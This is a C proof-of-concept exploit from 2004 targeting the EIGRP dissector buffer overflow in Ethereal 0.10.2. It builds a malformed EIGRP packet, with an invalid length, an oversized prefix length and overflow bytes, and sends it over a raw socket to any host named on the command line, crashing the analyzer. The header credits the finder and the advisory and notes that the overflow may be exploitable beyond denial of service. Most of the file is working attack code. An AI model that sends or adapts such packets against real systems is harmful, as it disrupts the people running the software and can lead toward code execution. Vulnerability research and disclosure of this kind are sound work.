/*
 * Ethereal network protocol analyzer
 * EIGRP Dissector TLV_IP_INT Long IP Address Overflow
 * vulnerability
 * proof of concept code
 * version 1.0 (Mar 26 2004)
 *
 * by R<E9>mi Denis-Courmont < ethereal at simphalampin dot com >
 *   http://www.simphalempin.com/dev/
 *
 * This vulnerability was found by:
 *   Stefan Esser <s.esser@e-matters.de>
 * whose original advisory may be fetched from:
 *   http://security.e-matters.de/advisories/032004.html
 *
 * Vulnerable:
 *  - Ethereal v0.10.2
 *
 * Not vulnerable:
 *  - Ethreal v0.10.3
 *
 * Note: this code will simply trigger a denial of service on Ethereal.
 * It should really be possible to exploit the buffer overflow
 * (apparently up to 29 bytes overflow), but I haven't tried.
 */


/*****************************************************************************
 * Copyright (C) 2004  R<E9>mi Denis-Courmont.  All rights reserved.
*
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright         *
 *    notice, this list of conditions and the following disclaimer.          *
 * 2. Redistributions in binary form must reproduce the above copyright      *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *****************************************************************************/


#include <string.h>
#include <stdio.h>

#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netdb.h>

static const char packet[] =
        "\x01" /* Version */
        "\x04" /* Opcode: Reply */
        "\x00\x00" /* Checksum (invalid) */
        "\x00\x00\x00\x00" /* Flags */
        "\x00\x00\x00\x00" /* Sequence number */
        "\x00\x00\x00\x00" /* ACK */
        "\x00\x00\x00\x00" /* AS number */

        /* IP internal routes TLV */
        "\x01\x02" /* Type */
        "\x00\x39" /* Length (should be 0x1C) */
        "\x00\x00\x00\x00" /* Next hop */
        "\x00\x00\x00\x00" /* Delay */
        "\x00\x00\x00\x00" /* Bandwitdh */
        "\x00\x00\x00" /* MTU */
        "\x00" /* Hop count: directly connected */
        "\xff" /* Reliability: maximum */
        "\x01" /* Load: minimum */
        "\x00\x00" /* Reserved */
        "\xff" /* Prefix length: should be > 0 and <= 32 */
        "\x00\x00\x00" /* Destination network */
        "\xff\xff\xff\xff" "\xff\xff\xff\xff"
        "\xff\xff\xff\xff" "\xff\xff\xff\xff"
        "\xff\xff\xff\xff" "\xff\xff\xff\xff"
        "\xff\xff\xff\xff" "\xff" /* buffer overflow */
;


static int
proof (const struct sockaddr_in *dest)
{
        int fd;
        size_t len;

        fd = socket (PF_INET, SOCK_RAW, 88);
        if (fd == -1)
        {
                perror ("Raw socket error");
                return 1;
        }

        len = sizeof (packet) - 1;
        if (sendto (fd, packet, len, 0, (const struct sockaddr *)dest,
                        sizeof (struct sockaddr_in)) != len)
        {
                perror ("Packet sending error");
                close (fd);
                return 1;
        }

        puts ("Packet sent!");
        close (fd);
        return 0;
}


static int
usage (const char *path)
{
        fprintf (stderr, "Usage: %s <hostname/IP>\n", path);
        return 2;
}


int
main (int argc, char *argv[])
{
        struct sockaddr *dest;

        puts ("Ethereal EIGRP Dissector TLV_IP_INT Long IP Address Overflow\n"
                "proof of concept code\n"
                "Copyright (C) 2004 R<E9>mi Denis-Courmont "
                "<\x65\x74\x68\x65\x72\x65\x61\x6c\x40\x73\x69\x6d\x70"
                "\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");


        if (argc != 2)
                return usage (argv[0]);
        else
        {
                struct addrinfo help, *res;
                int check;

                memset (&help, 0, sizeof (help));
                help.ai_family = PF_INET;

                check = getaddrinfo (argv[1], NULL, &help, &res);
                if (check)
                {
                        fprintf (stderr, "%s: %s\n", argv[1],
                                        gai_strerror (check));
                        return 1;
                }

                dest = res->ai_addr;
        }

        return proof ((const struct sockaddr_in *)dest);
}
